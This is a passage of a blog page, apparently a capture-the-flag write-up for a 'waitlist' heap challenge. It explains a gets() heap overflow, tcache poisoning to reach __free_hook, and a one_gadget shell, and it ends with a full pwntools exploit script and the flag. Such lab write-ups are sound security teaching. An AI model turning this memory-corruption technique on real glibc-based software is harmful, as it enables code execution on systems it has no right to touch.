+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Let&rsquo;s spam a bunch of characters in the name field and see what happens.</p>
+<pre tabindex="0"><code>Scenario: 
+1. Join the waitlist (queue #0) with name A*0x8
+2. Join the waitlist (queue #1) with name B*0x8
+3. Join the waitlist (queue #2) with name C*0x8
+4. Leave the waitlist (queue #1)
+5. Join the waitlist (queue #3, which is at the location of queue #1
+        due to tcache LIFO system) with name D*0x30
+6. View queue #2
+</code></pre><p>After step 4:</p>
+<figure class="full">
+<img src="assets/waitlist (10).png" width=90%>
+<figcaption></figcaption>
+</figure>
+<p>After step 5:</p>
+<figure class="full">
+<img src="assets/waitlist (11).png">
+<figcaption>We have overflowed queue #3, and have edited the chunk at queue #2</figcaption>
+</figure>
+<p>After step 6: we obtained a SIGSEGV. This means that from overflowing queue #3 into queue #2, we were able to successfully edit the chunk at queue #2 (hence crashing the binary).</p>
+<p>Thus, this acts as a proof of concept of heap overflow in the binary, in which we can overflow values to and hence control the next chunk.</p>
+<p>So how can we take advantage of this to get a shell?</p>
+<h2 id="obtaining-shell">Obtaining Shell</h2>
+<p>Through googling, I learnt that if I could allocate a chunk at <code>__free_hook</code>, I would be able to obtain a shell.</p>
+<p>How can I control the location of a chunk though?</p>
+<pre tabindex="0"><code>Scenario:
+1. Join the waitlist 3 times (queue #0, #1, #2)
+2. Leave the waitlist 3 times in the order of queue #0, #2, #1
+</code></pre><p>After step 2:</p>
+<figure class="full">
+<img src="assets/waitlist (14).png">
+<figcaption></figcaption>
+</figure>
+<p>When we next join the waitlist, queue #3 will take the position of queue #1 due to tcache&rsquo;s LIFO system.  In this case, can&rsquo;t we overflow into queue #2, editing the next tcache entry of queue #2 (red box) and changing it to <code>__free_hook</code> instead?</p>
+<br>
+<pre tabindex="0"><code>Scenario (cont):
+3. Join the waitlist (queue #3) and edit the &#34;next tcache entry&#34; of queue #2
+</code></pre><p>We need to fill in the metadata of queue #2&rsquo;s chunk correctly to prevent the binary from crashing.</p>
+<ul>
+<li>Use <code>b'A'*0x18</code> to fill the user input buffer of queue #3 (since our input starts at the blue box)</li>
+<li><code>b'\x21' + b'\x00'*7</code> ensures that <code>mchunk_size</code> of queue #2 maintains as 0x21</li>
+<li><code>p64(libc.symbols['__free_hook'])</code> overwrites next tcache entry to <code>__free_hook</code> (ensure that libc base is accounted for in this address)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">])</span>
+</span></span></code></pre></div><p>As such, we have successfully overwrote the tcache next entry value of queue #2. That means the next chunk allocated after allocating the chunk at queue #2 will take the location of <code>__free_hook</code>!</p>
+<pre tabindex="0"><code>Scenario (cont):
+4. Join the waitlist (queue #4, in position queue #2) and fill the name as anything
+5. Join the waitlist (queue #5, at the location of __free_hook) and fill the name using one_gadget
+6. Leave the waitlist (queue #5)
+7. Profit :)
+</code></pre><p>To explain why <code>__free_hook</code> works to get a shell:</p>
+<ul>
+<li><code>__free_hook</code> is called whenever <code>free()</code> is used.</li>
+<li><a href="https://github.com/david942j/one_gadget">one_gadget</a> is a nifty programme to get RCE from one gadget.</li>
+<li>By replacing <code>__free_hook</code> with one_gadget, our RCE gadget will instead be called whenever <code>free()</code> is used</li>
+<li>Thus, by deleting a chunk (using option 4), the one_gadget will proc, leading to shell :D</li>
+</ul>
+<h2 id="full-exploit">Full exploit</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./waitlist_patched&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">local</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf2.whitehats.site&#39;</span><span class="p">,</span> <span class="mi">2005</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">join</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">get libc leak
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">heap overflow due to gets()
+</span></span></span><span class="line"><span class="cl"><span class="s1">control the location of the next chunk to be at __free_hook to pop a shell
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAAA&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;BBBBB&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CCCCC&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;random&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x4f302</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># WH2024{w4ItIng_In_L1n3_f0r_c@t3g0ry_10K}</span>
+</span></span></code></pre></div>
+      </div>
+      <br>
+    </article>
+
+    <hr />
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://enxgmatic.github.io/ctf/secret-keyword/">
+                    <span class="button__text">Secret Keyword</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer id="site-footer" class="section-inner thin animated fadeIn faster footer">
+	<p>
+		&copy; 2024 enxgmatic
+		
+		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hello Friend NG</a>
+		
+		
+		
+	</p>
+
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.858712b4b19060b33e6a3b52df9749f413894a75772f4d0b4683380c0ce08c6f93623d63068ef5ae4719980bcaa15ad536694c42897b88c4826c6ece21918827.js" integrity="sha512-hYcStLGQYLM&#43;ajtS35dJ9BOJSnV3L00LRoM4DAzgjG&#43;TYj1jBo71rkcZmAvKoVrVNmlMQol7iMSCbG7OIZGIJw=="></script>
+
+
+
+
+    </body>
+</html>
